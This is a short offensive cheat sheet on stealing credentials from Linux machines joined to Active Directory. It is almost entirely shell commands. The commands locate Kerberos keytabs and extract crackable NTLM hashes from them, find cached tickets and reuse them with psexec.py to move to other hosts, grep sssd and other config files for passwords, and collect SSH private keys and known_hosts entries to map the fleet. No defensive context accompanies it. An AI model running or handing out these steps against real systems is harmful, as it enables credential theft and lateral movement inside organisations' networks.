Linux boxes joined to AD (via `realmd`/`sssd`, or just running scheduled jobs with domain creds) leave Kerberos material on disk the same way LSASS holds it on Windows — the trick is knowing where to look.

```
# Keytabs — service account creds stored in plaintext-extractable form:
find / -name "*.keytab" 2>/dev/null
klist -k -t /etc/krb5.keytab                       # list principals in a keytab
python3 keytabextract.py /etc/krb5.keytab           # → NTLM hash, crackable

# Cached Kerberos tickets (ccache) — reusable AS-IS, no cracking needed:
find / -name "krb5cc_*" -o -name "*.ccache" 2>/dev/null
env | grep KRB5CCNAME
klist                                                # if a ticket is loaded
export KRB5CCNAME=/tmp/krb5cc_1000
psexec.py -k -no-pass corp.local/user@<target>      # reuse it elsewhere

# Config files with embedded domain/LDAP bind creds:
cat /etc/sssd/sssd.conf 2>/dev/null | grep -i "ldap_default\|password"
find / -name "*.conf" -o -name "*.cnf" 2>/dev/null | xargs grep -li "password" 2>/dev/null

# SSH keys / known_hosts reused across the domain's Linux fleet:
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
cat ~/.ssh/known_hosts 2>/dev/null    # tells you what else this box talks to
```